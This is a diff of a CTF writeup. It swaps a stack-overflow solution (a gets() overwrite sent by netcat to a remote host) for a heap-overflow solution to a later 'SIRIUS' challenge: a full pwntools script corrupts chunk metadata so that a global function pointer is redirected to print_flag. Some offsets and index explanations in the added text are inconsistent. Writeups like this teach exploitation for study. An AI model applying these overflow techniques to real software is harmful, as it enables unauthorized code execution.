@@ -1,67 +1,152 @@
 # SIRIUS – PART III CTF Writeup
 
 
-![f56de5_911f969f057d4a149f8c30d27daa74cb~mv2](https://github.com/user-attachments/assets/ed0b076b-af90-4e28-835d-bde8669d36bd)
+
+![K3QC5HKUYNGPBM2EIMEC6SLC6SHSWGFV](https://github.com/user-attachments/assets/26f599e2-dcef-4c0c-8d9a-8cf2615e05b4)
 
 
 ## Challenge Overview
 
+This challenge is a heap exploitation / use-after-free / heap metadata corruption challenge with a twist:
+the goal is to overwrite a global function pointer (victim) on the BSS by corrupting a chunk_t metadata structure stored on the heap.
 
-The program reads a line with `gets()` into a 64-byte buffer on the stack (`char buf[64]`) and stores an int auth right after it (initialized to 0). If `auth == 0x1337` after input, the program prints the poem and reads/prints flag.txt. The objective is to craft input that overflows buf and overwrites auth with the magic value `0x1337`.
+
+
 
 ## Vulnerability
 
 
+Out-of-bounds write (heap overflow) — do_edit() asks for a byte count n and then calls read_all(STDIN_FILENO, c->data, n) without checking n against c->size. That allows writing arbitrary bytes beyond the allocated c->data buffer on the heap, corrupting adjacent heap memory.
 
-Use of `gets()` — `gets()` never bounds checks input. It allows arbitrary-length writes into `buf`. This is the direct source of the buffer overflow.
+Persistent metadata in linear array — table[] stores pointers to metadata (chunk_t *) that remain allocated for the lifetime of the process. The program does not free or clear table[idx] when do_free() is called; do_free() only frees c->data but leaves the chunk_t structure (the metadata) in place and still pointed to by table[idx]. This makes it possible to corrupt the metadata and later use it.
 
-Stack-local `auth` variable adjacent to `buf` — `auth` (an `int`) is stored on the stack immediately after `buf` and can be overwritten by overflowing `buf`.
+Writable function pointer in data section — the binary has a global function pointer void (*victim)(void) = NULL; that the exploit targets. If the attacker can write an address into that location, the program will call it from invoke_ritual() (with minimal checks), enabling code flow to print_flag().
 
-No explicit stack protections assumed in challenge — the challenge likely expects exploitation through overwriting `auth`. Depending on compilation flags and platform, other hardening may be present (stack canaries, ASLR, PIE, NX). The simplest route is a straight overwrite of `auth`, not return-address control.
-
-
-
+Lack of mitigations / fixed addresses used — the provided solver uses hardcoded addresses (PRINT_FLAG and the address of the victim pointer). In a real remote, either ASLR is disabled or these addresses can be discovered (e.g., via symbol info in the distributed binary or a prior leak).
 
 
 
-<img width="166" height="169" alt="image" src="https://github.com/user-attachments/assets/ebd35b20-5fd8-4ab3-a860-140b40598e2a" />
+
+
 
 
 
 ## Exploit Strat
 
-```buf``` is 64 bytes. Writing 64 bytes fills ```buf```. The next 4 bytes on the stack are ```auth``` (an ```int```), so write additional 4 bytes with the little-endian representation of ```0x1337``` ```(b'\x37\x13\x00\x00')``` to overwrite ```auth```.
+Use a chunk we control to overflow into an adjacent chunk_t metadata structure.
 
-Send the total payload: ```64 bytes filler + 4 bytes p32(0x1337)```. The program will then check auth and, if equal, run sirius_poem() and print_flag().
+Overwrite the adjacent chunk_t’s data pointer to point at the global victim function-pointer variable address.
 
-```Important note about printf("%s", buf): the program prints buf after the gets(). If your 4 bytes for auth include \x00 (they do), the printed string will be truncated at the first \x00. That does not affect the overwrite; gets() wrote the bytes into memory, and auth will be overwritten. The only consequence is less visible echo output.```
+Use the program’s edit functionality on that adjacent entry to write the print_flag function address into victim.
 
-
-
-
-
-
-<img width="520" height="415" alt="image" src="https://github.com/user-attachments/assets/8c097a50-2384-469a-b1e2-b8363d675749" />
+Call the “Invoke ritual” menu option — the program will call victim() (now print_flag), printing the flag.
 
 
 
-Netcat Version
-```python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\x37\x13\x00\x00')" | nc 72.146.224.45 6050```
+Python Script For The Exploit
 
-Local Version
-```python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\x37\x13\x00\x00')" | ./sirius2```
+```
+
+#!/usr/bin/env python3
+from pwn import *
+context.arch = 'amd64'
+context.log_level = 'info'
+
+# Hardcoded addresses (from nm ./sirius3)
+PRINT_FLAG = 0x401206
+VICTIM = 0x404160
+
+log.success(f"print_flag @ {hex(PRINT_FLAG)}")
+log.success(f"victim @ {hex(VICTIM)}")
+
+# Connect to remote server
+p = remote('72.146.224.45', 6060)
+
+# Helper functions
+def alloc(size):
+    p.sendlineafter(b'Choice: ', b'1')
+    p.sendlineafter(b'size (decimal): ', str(size).encode())
+
+def edit(idx, length, data):
+    p.sendlineafter(b'Choice: ', b'3')
+    p.sendlineafter(b'index: ', str(idx).encode())
+    p.sendlineafter(b'bytes to write (decimal): ', str(length).encode())
+    p.recvuntil(b'Enter data')
+    p.send(data)
+
+def invoke():
+    p.sendlineafter(b'Choice: ', b'6')
+
+# ========== EXPLOIT ==========
+log.info("=== Starting Exploit ===")
+
+# Allocate chunk 0
+log.info("Step 1: Allocating chunk...")
+alloc(0x40)
+
+# Build overflow payload
+log.info("Step 2: Building overflow payload...")
+payload = b'A' * 0x40      # Fill data0 buffer
+payload += p64(0)          # malloc prev_size
+payload += p64(0x41)       # malloc size
+payload += p64(0x40)       # chunk_t->size
+payload += p64(VICTIM)     # chunk_t->data = &victim
+payload += b'X' * 32       # chunk_t->name
+payload += p32(1)          # chunk_t->in_use
+
+# Send overflow
+log.info("Step 3: Overflowing...")
+edit(0, len(payload), payload)
+
+# Write print_flag to victim
+log.info("Step 4: Writing print_flag to victim...")
+edit(0, 8, p64(PRINT_FLAG))
+
+# Trigger win
+log.info("Step 5: Invoking ritual!")
+invoke()
+
+p.interactive()
+
+
+```
+
+
+1- alloc(0x40) — allocate a chunk (first free slot after the initial two entries, usually index 2). This gives us another chunk but the exploit uses the existing init chunk at index 0 as the overflow source.
+
+2- Build the overflow payload described above. Important offset choices:
+
+b'A' * 0x40 overflows more than the init->data (which is 0x30 in the binary). The extra bytes write into the contiguous heap region where the next chunk_t metadata (“control”) resides.
+
+At the exact offset for the data field of the control chunk_t, they store p64(VICTIM) — i.e., the address of the victim pointer variable.
+
+3- edit(0, len(payload), payload) — write the big payload into init->data (index 0). The unchecked write thus corrupts the next chunk’s metadata (control), overwriting control->data so that the program believes that the control chunk’s data pointer points at &victim.
+
+4- edit(0, 8, p64(PRINT_FLAG)) — this next write in the solver writes 8 bytes (the address of print_flag) into the corrupted control->data location. Practically, the exploit uses the program’s edit function on the chunk whose metadata we corrupted — so the read_all() call will ultimately write to the location pointed to by that chunk’s data pointer. In the solver this ends up writing PRINT_FLAG into the victim global pointer.
+
+(Implementation note: depending on the exact heap packing produced by the libc allocator / binary, the script indexes used for the second edit can differ; the solver demonstrates a working sequence for the deployed binary.)
+
+invoke() — call “Invoke ritual”. invoke_ritual() checks if (victim == print_flag) first; but because victim now points to print_flag, it triggers the sirius_poem() + print_flag() flow. The print_flag() reads and prints flag.txt.
+
+p.interactive() — keep the session open to see the flag or interact further.
 
 
 
-<img width="898" height="750" alt="image" src="https://github.com/user-attachments/assets/7a4f4823-939c-49a9-b2b2-850ffc21ac8f" />
 
 
-and you'll get the flag
+and you'll get the "flag" which is an image
+
+![rosalina](https://github.com/user-attachments/assets/18751aa7-7a26-4a76-ad25-109f4f46b084)
+
+Now The Fun Part
 
 
-![f56de5_6584518088b7413393bb1304e9f84d63~mv2](https://github.com/user-attachments/assets/adbb10bf-5ba9-4f1a-a48f-7051e532a5d2)
-![f56de5_27c05ecb81b54ab58891a427af42bdc9~mv2](https://github.com/user-attachments/assets/62a0981a-7f6a-4b07-9aee-98142cd5e698)
-![f56de5_b24cf5757f924513ab0a668449a72683~mv2](https://github.com/user-attachments/assets/98b16629-b7fc-4ae4-a916-dd5f5c32d7a6)
-![f56de5_2e2d8684ba7b4eb093e8e882c1112e67~mv2](https://github.com/user-attachments/assets/d3759cda-d73e-4ec0-abd8-2dc4ee4cd522)
-![f56de5_4856931d61e64c2dbdca720c88cc5153~mv2](https://github.com/user-attachments/assets/e6647810-c12a-4dcf-bc1e-3697f77b95dd)
+
+
+
+
+
+
+
+
 
